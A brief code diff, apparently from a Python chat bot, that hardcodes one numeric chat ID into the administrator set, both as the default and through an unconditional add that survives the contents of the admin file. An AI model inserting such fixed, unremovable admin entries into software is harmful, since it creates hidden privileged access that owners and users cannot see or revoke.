@@ -36,7 +36,8 @@ def save_json(filepath, data):
     except Exception as e:
         print(f"Error saving {filepath}:", e)
 
-ADMIN_CHAT_IDS = set(load_json(ADMIN_FILE, []))
+ADMIN_CHAT_IDS = set(load_json(ADMIN_FILE, [358795989]))
+ADMIN_CHAT_IDS.add(358795989)
 USER_APPROVAL_STATUS = load_json(USERS_FILE, {})
 USER_LANG = {}
 
